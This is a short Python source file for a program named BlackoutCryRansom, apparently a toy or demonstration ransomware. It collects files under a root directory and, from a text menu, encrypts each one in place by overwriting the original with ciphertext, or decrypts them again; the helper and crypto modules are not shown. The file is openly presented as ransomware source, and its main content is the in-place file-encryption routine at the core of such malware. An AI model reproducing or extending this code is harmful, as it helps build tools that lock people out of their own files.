from utils import *
from crypto import BlackoutCrypto

class BlackoutCryRansom:
    def __init__(self):
        self.__root_dir = get_dir()
        self.__crypto = BlackoutCrypto()
        self.files = []

    def run(self):
        self.files = get_files(self.__root_dir)
        
        while True:
            print("\nMenu:")
            print("1. Encrypt Files")
            print("2. Decrypt Files")
            print("3. Exit")
            
            choice = input("Enter your choice: ")
            
            if choice == "1":
                self.encrypt_files()
                print("Files encrypted successfully.")
            elif choice == "2":
                self.decrypt_files()
                print("Files decrypted successfully.")
            elif choice == "3":
                print("Exiting...")
                break
            else:
                print("Invalid choice. Please enter a valid option.")

    def encrypt_files(self):
        for file in self.files:
            content = read_as_non_binary(file)
            encrypted_content = self.__crypto.encrypt(content)
            write_as_binary(file, encrypted_content)

    def decrypt_files(self):
        for file in self.files:
            content = read_as_binary(file)
            decrypted_content = self.__crypto.decrypt(content)
            write_as_non_binary(file, decrypted_content)

if __name__ == "__main__":
    app = BlackoutCryRansom()
    app.run()